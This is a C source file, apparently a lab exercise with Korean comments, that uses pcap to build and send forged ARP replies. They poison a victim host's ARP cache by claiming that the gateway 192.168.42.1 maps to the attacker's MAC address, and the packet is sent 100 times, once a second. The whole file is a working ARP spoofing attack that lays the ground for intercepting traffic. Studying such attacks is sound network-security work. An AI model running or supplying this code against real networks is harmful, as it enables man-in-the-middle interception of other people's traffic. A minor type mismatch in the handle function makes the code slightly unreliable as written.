#define CRT_SECURE_WARNINGS
#include<WinSock2.h>  //htons(), htonl() 함수 사용하게 해줌
#include<pcap.h>      //네트워크 프로그래밍 함수 제공
#include<stdio.h>
#include<stdint.h>    // 자료형 정리하여 제공
#include<string.h>

#pragma warning(disable:4996)
#pragma warning(disable:6011)

#define ETH_LEN 6
#define IP_LEN 4

#define ETHERTYPE_ARP 0x0806

//구조체 선언
#pragma pack(push, 1)
struct ether_header {
	uint8_t dst_host[ETH_LEN];
	uint8_t src_host[ETH_LEN];
	uint16_t ether_type;

};
#pragma pack(pop)

#pragma pack(push, 1)
struct arp_header
{
	uint16_t hw_type;
	uint16_t protocol_type;
	uint8_t hw_size;
	uint8_t protocol_size;
	uint16_t opcode;
	uint8_t sender_host[ETH_LEN];
	uint8_t sender_ip[IP_LEN];
	uint8_t target_host[ETH_LEN];
	uint8_t target_ip[IP_LEN];
};
#pragma pack(pop)

// pcap 함수 선언
int get_pcap_handle()
{
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_if_t* allDev;
	if (pcap_findalldevs(&allDev, errbuf) == PCAP_ERROR)
	{
		printf("[ERROR] pcap_findalldevs() : %s\n", errbuf);
		return NULL;
	}
	// 네트워크 장치를 가져옴

	pcap_if_t* tempDev;
	int i = 0;
	for (tempDev = allDev; tempDev != NULL; tempDev = tempDev->next)
	{
		printf("%d %s", ++i, tempDev->name);
		if (tempDev->description)
			printf(" (%s)\n", tempDev->description);
		else printf("\n");
	}

	int select;

	printf("select interface numberr (1-%d) : ", i);
	scanf("%d", &select);
	for (tempDev = allDev, i = 0; i < select - 1; tempDev = tempDev->next, i++);

	pcap_t* _handle = pcap_open(tempDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);
	if (_handle == NULL)
	{
		printf("[ERROR] pcap_open() : %s\n", errbuf);
		return NULL;

	}
	pcap_freealldevs(allDev);
	return _handle;

}

void make_arp_reply(uint8_t _packet[], int* _length)
{
	struct ether_header eth;


	eth.dst_host[0] = 0xd4;
	eth.dst_host[1] = 0xbe;
	eth.dst_host[2] = 0xd9;
	eth.dst_host[3] = 0x92;
	eth.dst_host[4] = 0x38;
	eth.dst_host[5] = 0x1f; //피해자

	eth.src_host[0] = 0xe0;
	eth.src_host[1] = 0xd5;
	eth.src_host[2] = 0x5e;
	eth.src_host[3] = 0xe5;
	eth.src_host[4] = 0x37;
	eth.src_host[5] = 0x36; //공격자

	eth.ether_type = htons(ETHERTYPE_ARP);

	struct arp_header arp;

	arp.hw_type = htons(0x0001);
	arp.protocol_type = htons(0x0800);   //IPv4 0x0800
	arp.hw_size = 0x06;
	arp.protocol_size = 0x04;
	arp.opcode = htons(0x0002);

	arp.sender_host[0] = 0xe0;
	arp.sender_host[1] = 0xd5;
	arp.sender_host[2] = 0x5e;
	arp.sender_host[3] = 0xe5;
	arp.sender_host[4] = 0x37;
	arp.sender_host[5] = 0x36;  // 공격자

	arp.sender_ip[0] = 192;
	arp.sender_ip[1] = 168;
	arp.sender_ip[2] = 42;
	arp.sender_ip[3] = 1;       //Gateway

	arp.target_host[0] = 0xd4;
	arp.target_host[1] = 0xbe;
	arp.target_host[2] = 0xd9;
	arp.target_host[3] = 0x92;
	arp.target_host[4] = 0x38;
	arp.target_host[5] = 0x1f;   //피해자

	arp.target_ip[0] = 192;
	arp.target_ip[1] = 168;
	arp.target_ip[2] = 42;
	arp.target_ip[3] = 5;  //피해자

	memcpy(_packet, &eth, sizeof(eth));
	*_length += sizeof(eth);

	memcpy(_packet + *_length, &arp, sizeof(arp));
	*_length += sizeof(arp);
}

int main(void)
{
	pcap_t* dev_handle = get_pcap_handle();
	if (dev_handle == NULL)
	{
		printf("[ERROR] get_pcap_handle()\n");
		return -1;
	}

	uint8_t arp_packet[100] = { 0 };
	int arp_packet_len = 0;
	make_arp_reply(arp_packet, &arp_packet_len);

	for (int i = 0; i < 100; i++)
	{
		pcap_sendpacket(dev_handle, arp_packet, arp_packet_len);
		Sleep(1000);

	}
	

}